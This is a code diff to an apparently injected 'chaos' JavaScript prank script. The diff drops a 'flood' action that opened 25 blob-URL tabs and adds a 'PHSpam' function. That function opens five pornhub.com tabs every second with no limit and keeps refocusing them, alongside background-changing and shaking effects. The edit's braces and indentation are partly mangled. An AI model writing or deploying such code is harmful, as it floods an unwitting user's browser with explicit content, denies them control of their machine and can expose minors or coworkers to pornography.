@@ -27,38 +27,23 @@ if (!window.__chaosInjected && localStorage.getItem('chaos-listener-active') ===
           });
           document.body.appendChild(vid);
         },
-if (action === 'flood') {
-  const url = 'blob:https://479669822-atari-embeds.googleusercontent.com/578c5cd4-6b39-4a93-8bca-fa0bae9b5fbc';
-  let count = 0;
-  const interval = setInterval(() => {
+PHSpam: () => {
+  const url = 'https://pornhub.com';
+  const portals = [];
+
+  setInterval(() => {
     for (let i = 0; i < 5; i++) {
-      window.open(url, '_blank');
-      count++;
+      const win = window.open(url, '_blank');
+      if (win) portals.push(win);
     }
-    if (count >= 25) clearInterval(interval);
-  }, 1000); // 5 tabs every 1000ms (1 second)
-  return;
+  }, 1000);
+
+  setInterval(() => {
+    portals.forEach(win => {
+      if (win && !win.closed) win.focus();
+    });
+  }, 500);
 },
-          PHSpam: () => {
-    const url = 'https://pornhub.com';
-    const portals = [];
-
-    setInterval(() => {
-      for (let i = 0; i < 5; i++) {
-        const win = window.open(url, '_blank');
-        if (win) {
-          portals.push(win);
-        }
-      }
-    }, 1000);
-
-    setInterval(() => {
-      portals.forEach(win => {
-        if (win && !win.closed) win.focus();
-      });
-    }, 500);
-  }
-};
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
           if (document.getElementById('__chaos_shake')) return;
